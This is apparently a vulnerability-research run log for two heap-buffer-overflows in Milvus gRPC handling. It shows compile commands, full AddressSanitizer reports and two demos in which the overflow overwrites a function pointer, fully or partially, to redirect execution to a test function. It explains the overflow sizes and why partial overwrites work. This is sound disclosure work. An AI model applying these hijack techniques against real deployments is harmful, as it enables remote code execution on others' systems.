# Run log — C1/C2 PoCs (verbatim)

Complete, unedited transcript of building and running the four PoCs. Only the
random per-run addresses (ASan `0x...` pointers, PIDs, BuildIds) differ between
runs; the shapes below are reproducible with `make asan` / `make rce`.

**Environment**

```
g++ (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0
GNU ld (GNU Binutils for Ubuntu) 2.42
Linux 6.18.5 x86_64
```

---

## C1 — ASan detection

```console
$ g++ -g -O0 -fsanitize=address poc_c1_asan.cpp -o c1_asan

$ ASAN_OPTIONS=abort_on_error=0 ./c1_asan
=================================================================
==7560==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000011 at pc 0x7f8fa5efb303 bp 0x7ffc7a667e80 sp 0x7ffc7a667628
WRITE of size 32 at 0x502000000011 thread T0
    #0 0x7f8fa5efb302 in memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors_memintrinsics.inc:115
    #1 0x5579c6b0e59e in VectorArray_float_branch(VectorFieldProto const&) /home/user/milvus/security-research/grpc-memory-c1-c2/poc_c1_asan.cpp:27
    #2 0x5579c6b0e83c in main /home/user/milvus/security-research/grpc-memory-c1-c2/poc_c1_asan.cpp:44
    #3 0x7f8fa562a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #4 0x7f8fa562a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #5 0x5579c6b0e424 in _start (/home/user/milvus/security-research/grpc-memory-c1-c2/c1_asan+0x2424) (BuildId: 79cf7147e8cb5efe3d2c57343c131e659338953e)

0x502000000011 is located 0 bytes after 1-byte region [0x502000000010,0x502000000011)
allocated by thread T0 here:
    #0 0x7f8fa5efe6c8 in operator new[](unsigned long) ../../../../src/libsanitizer/asan/asan_new_delete.cpp:98
    #1 0x5579c6b0e558 in VectorArray_float_branch(VectorFieldProto const&) /home/user/milvus/security-research/grpc-memory-c1-c2/poc_c1_asan.cpp:25
    #2 0x5579c6b0e83c in main /home/user/milvus/security-research/grpc-memory-c1-c2/poc_c1_asan.cpp:44
    #3 0x7f8fa562a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #4 0x7f8fa562a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #5 0x5579c6b0e424 in _start (/home/user/milvus/security-research/grpc-memory-c1-c2/c1_asan+0x2424) (BuildId: 79cf7147e8cb5efe3d2c57343c131e659338953e)

SUMMARY: AddressSanitizer: heap-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors_memintrinsics.inc:115 in memcpy
Shadow bytes around the buggy address:
  0x501ffffffd80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501ffffffe00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501ffffffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501fffffff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501fffffff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x502000000000: fa fa[01]fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==7560==ABORTING
```

Key lines: `WRITE of size 32` (all 8 attacker floats × 4 bytes) landing `0 bytes after`
a `1-byte region` — the region is the `new float[0]` rounded to a 1-byte allocation —
allocated at `poc_c1_asan.cpp:25` (`new float[length_*dim_]`).

---

## C2 — ASan detection

```console
$ g++ -g -O0 -fsanitize=address poc_c2_asan.cpp -o c2_asan

$ ASAN_OPTIONS=abort_on_error=0 ./c2_asan
=================================================================
==7566==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000018 at pc 0x7fc1b62fb303 bp 0x7ffdd3064d50 sp 0x7ffdd30644f8
WRITE of size 13 at 0x502000000018 thread T0
    #0 0x7fc1b62fb302 in memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors_memintrinsics.inc:115
    #1 0x55ae82b5a3b3 in CopyAndWrapSparseRow(void const*, unsigned long, bool) /home/user/milvus/security-research/grpc-memory-c1-c2/poc_c2_asan.cpp:28
    #2 0x55ae82b5a561 in main /home/user/milvus/security-research/grpc-memory-c1-c2/poc_c2_asan.cpp:42
    #3 0x7fc1b5a2a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #4 0x7fc1b5a2a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #5 0x55ae82b5a284 in _start (/home/user/milvus/security-research/grpc-memory-c1-c2/c2_asan+0x1284) (BuildId: 7dea7e25f10ae0abe7b89078c7d87e69d8e4701e)

0x502000000018 is located 0 bytes after 8-byte region [0x502000000010,0x502000000018)
allocated by thread T0 here:
    #0 0x7fc1b62fe6c8 in operator new[](unsigned long) ../../../../src/libsanitizer/asan/asan_new_delete.cpp:98
    #1 0x55ae82b5a6e1 in SparseRow::SparseRow(unsigned long) /home/user/milvus/security-research/grpc-memory-c1-c2/poc_c2_asan.cpp:17
    #2 0x55ae82b5a391 in CopyAndWrapSparseRow(void const*, unsigned long, bool) /home/user/milvus/security-research/grpc-memory-c1-c2/poc_c2_asan.cpp:27
    #3 0x55ae82b5a561 in main /home/user/milvus/security-research/grpc-memory-c1-c2/poc_c2_asan.cpp:42
    #4 0x7fc1b5a2a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #5 0x7fc1b5a2a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #6 0x55ae82b5a284 in _start (/home/user/milvus/security-research/grpc-memory-c1-c2/c2_asan+0x1284) (BuildId: 7dea7e25f10ae0abe7b89078c7d87e69d8e4701e)

SUMMARY: AddressSanitizer: heap-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors_memintrinsics.inc:115 in memcpy
Shadow bytes around the buggy address:
  0x501ffffffd80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501ffffffe00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501ffffffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501fffffff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501fffffff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x502000000000: fa fa 00[fa]fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==7566==ABORTING
```

Key lines: `WRITE of size 13` landing `0 bytes after` an `8-byte region` — the
`SparseRow(1)` buffer — allocated at `poc_c2_asan.cpp:17` (`SparseRow::SparseRow`). The
`00` shadow byte before the redzone confirms the 8-byte buffer was fully addressable; the
5 bytes past it are the overflow.

---

## C1 — control-flow hijack (RCE demo)

```console
$ g++ -g -O0 -no-pie poc_c1_rce.cpp -o c1_rce

$ ./c1_rce
[C1] before call: victim->handler = 0x40134c (legit=0x401332, win=0x40134c)
[C1] *** win() executed via hijacked pointer — arbitrary code exec ***
[C1]     (a real exploit would exec /bin/sh here)
```

`victim->handler` was `legit_handler` (`0x401332`); the overflow rewrote the full 8-byte
pointer to `&win` (`0x40134c`); the subsequent call landed in `win()`.

---

## C2 — partial-overwrite hijack (limited-RCE demo)

```console
$ g++ -g -O0 -no-pie poc_c2_rce.cpp -o c2_rce

$ ./c2_rce
[C2] &legit=0x4011d2  &win=0x4011ec  high-3-bytes match: yes (hijack viable)
[C2] before call: victim->handler = 0x4011ec
[C2] *** win() executed via partially-overwritten pointer — code exec ***
```

The 5-byte overflow overwrote only the low bytes of `victim->handler`. Because `win` and
`legit_handler` share their high 3 bytes (same `.text` segment), the partial write still
produced a valid redirect to `win()`. Against a target that does *not* share high bytes,
the same write would land on an invalid address and only crash — the reason C2 is rated
*limited* RCE.
```

> Note on run-to-run variance: ASan `0x...` addresses, PIDs (`==NNNN==`), and `BuildId`
> values change every build/run; the `-no-pie` RCE addresses (`0x40xxxx`) are stable. The
> **sizes** (`32`, `13`), **region sizes** (`1-byte`, `8-byte`), and the hijack outcome are
> invariant.
